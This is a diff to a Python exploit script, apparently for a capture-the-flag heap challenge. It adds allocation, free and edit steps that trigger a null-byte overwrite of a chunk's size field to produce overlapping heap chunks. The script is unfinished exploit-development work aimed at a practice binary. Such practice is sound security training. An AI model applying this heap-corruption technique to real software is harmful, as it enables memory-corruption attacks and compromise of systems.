@@ -40,6 +40,9 @@ def create(p, size, value):
     sl(p,b"%i" % size)
     ru(p,b"str?")
     s(p,value)
+    ru(p,b" stored at ") 
+    return int(rl(p).split(b"!")[0])
+    
 
 def edit(p, index, value):
     ru(p,b"exit\n")
@@ -73,6 +76,7 @@ def exploit(p,e,l):
     for i in range(3):
         delete(p,i)
     
+    chunk_size = 0x508
     
     create(p,0x518,b"A"*8)
     create(p,0x518,b"A"*8)
@@ -94,11 +98,40 @@ def exploit(p,e,l):
     for i in range(7):
         delete(p,i)
 
+
+
     pause()
 
-    create(p, 0xf8, b"A" * 0xf8)
-    create(p, 0xf8, b"B")
-    create(p, 0xf8, b"C")
+    x = create(p, chunk_size, b"X" * chunk_size)
+    y = create(p, chunk_size, b"Y" * chunk_size)
+    z = create(p, chunk_size, b"Z" * chunk_size)
+
+    log.info(f"Allocated chunks x,y,z at {x},{y},{z}")
+
+    pause()
+
+    delete(p,y)
+    log.info("Freed chunk y")
+
+    
+    pause()
+
+    t = create(p, chunk_size, b"T")
+    create(p, chunk_size, b"S")
+    log.info("Created two chunks")
+
+    pause()
+
+    edit(p,0,b"\x11")
+    log.info(f"Triggering null byte overwrite of y's size field")
+
+
+    pause()
+
+    delete(p,t)
+    delete(p,z)
+    log.info("Should have overlapping chunks")
+
     #create(p, 0x508, b"B" * 0x4f0 + p64(0x280) + b"B" * 0x10)
     #create(p, 0x88, b"C" * 0x88)
 
